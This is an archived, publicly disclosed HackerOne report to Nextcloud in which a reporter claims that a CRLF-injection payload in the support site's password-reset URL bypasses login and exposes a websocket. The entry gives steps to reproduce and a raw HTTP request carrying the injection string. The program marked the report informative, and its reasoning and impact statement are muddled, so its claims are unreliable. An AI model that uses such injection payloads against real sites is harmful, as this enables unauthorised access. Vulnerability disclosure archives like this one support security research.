---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "informative"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2021-04-20
submitted: 2021-02-13T15:55:38.406Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "deb0con"
source: "https://hackerone.com/reports/1102780"
title: "bypassing dashboard without account + Information disclosure trough websockets "
---
# bypassing dashboard without account + Information disclosure trough websockets 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Nextcloud | **Disclosed:** 2021-04-20

- Report: [https://hackerone.com/reports/1102780](https://hackerone.com/reports/1102780)
- CWE: Improper Access Control - Generic
- Submitted: 2021-02-13T15:55:38.406Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Sumarry :** 
I found a information disclosure for bypassing parameter url attacker can redirect to dashboard without login user/pass page
and websocket can be exposed in response/dashboard.

**URL Effected**
https://support.nextcloud.com/#password_reset

### Steps To Reproduce:
  * Opened directory at https://support.nextcloud.com/#password_reset
  * Forget-password  and repeat url to burp-suite
  * In directory added a parameter bypass is ``//%0d%0aSet-Cookie:%20crlf-injection=mickeybrew//``
  * and look a responsive , you can be redirect to dashboard panel without user/pass
  * Show the ``network-browser`` and you can found api directory and websocket
  * Directory websocket is https://support.nextcloud.com/api/v1/signshow
  * Opened it and **Boom** You can see Information disclosure through websocket

**Request**
```
GET #password_reset/%0d%0aSet-Cookie:%20crlf-injection=mickey HTTP/1.1
Host: support.nextcloud.com
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 91
```
 ### Screenshots POC
█████
██████
███████
███

## Impact

It may cause the attacker to log into the dashboard page without logging in via user/pass, and the attacker finds sensitive files on open fires.

## Timeline

- **Report Filed**
- **2021-02-13** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
